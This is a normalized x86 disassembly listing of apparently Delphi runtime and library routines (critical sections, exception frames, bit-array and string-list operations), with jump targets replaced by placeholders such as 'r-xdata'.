mov eax [ ebx ]
call sub_413844
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413a1c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b3c
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4137a8
dec ebp
inc edi
jne r-xdata
sub_413acc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_413b20
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034b4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c24
xor eax eax
push ebp
push sub_413b82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403128
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403118
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b89
mov eax [ ebp - 0x4 ]
call sub_413c88
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413b9c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c24
xor eax eax
push ebp
push sub_413c18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41375c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413914
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c1f
mov eax [ ebp - 0x4 ]
call sub_413c88
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413844
sub_413c38
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c24
xor eax eax
push ebp
push sub_413c7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4139fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c82
mov eax [ ebp - 0x4 ]
call sub_413c88
retn
sub_413c94
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413ce8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_413ce8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413cc4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b3c
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_413cdc
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_413d8c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413cc4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413ce8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413dd0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_413e48
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_416540
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_413e88
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413f3e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f10
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403078
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f45
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_413f64
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_413ff9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403078
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4040dc
mov eax ebx
mov si 0xffff
call sub_403324
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414000
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax ebx
mov si 0xffff
call sub_403324
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403324
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4041f8
sub_41400b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40337c
mov eax ebx
mov si 0xffff
call sub_403324
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403324
push eax
lea eax [ ebx + 0x4 ]
call sub_4054b4
mov ecx eax
mov edx r-xdata
pop eax
call sub_4031dc
sub_414056
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414088
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4140a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4140d0
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4140f0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41414a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_4139a0
call sub_403128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414158
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414cb0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_414188
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4141ac
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4141d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414277
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414320
xor eax eax
push ebp
push sub_41425a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414261
mov eax [ ebp - 0x4 ]
call sub_4143dc
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414288
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413e74
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414320
xor eax eax
push ebp
push sub_414308
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4143dc
retn
sub_414338
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4143f0
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414390
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414b48
mov eax [ ebp - 0x8 ]
push eax
push sub_414df8
push ebp
call sub_414338
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4143f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414485
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41448c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403e9c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404284
jne r-xdata
sub_41449c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414498
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
jmp sub_4038b4
sub_4144d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41451c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405978
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41449c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414523
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_41452c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414604
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414320
xor eax eax
push ebp
push sub_4145e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145e9
mov eax [ ebp - 0x4 ]
call sub_4143dc
retn
sub_414620
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414665
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404338
call sub_4085c8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41466c
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_414674
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41477f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f10
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403f68
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414786
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403e9c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404138
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404138
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404138
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404138
mov ebx eax
test ebx ebx
je r-xdata
sub_41479c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414814
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41481b
lea eax [ ebp - 0xc ]
call sub_403e78
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414828
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4148eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404398
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_414e88
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404060
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40bf68
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148f2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403e9c
lea eax [ ebp - 0xc ]
call sub_403e78
retn
sub_4148fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414930
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414960
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4159c4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4149a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149af
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_4149b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414a51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414320
xor eax eax
push ebp
push sub_414a34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415510
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403f68
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a3b
mov eax [ ebp - 0x4 ]
call sub_4143dc
retn
sub_414a60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b01
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b08
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
call sub_414320
xor eax eax
push ebp
push sub_414ae4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4143dc
retn
sub_414b10
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414b48
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414bec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417700
mov eax [ ebp - 0x4 ]
call sub_414320
xor eax eax
push ebp
push sub_414bc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41679c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4183a0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bce
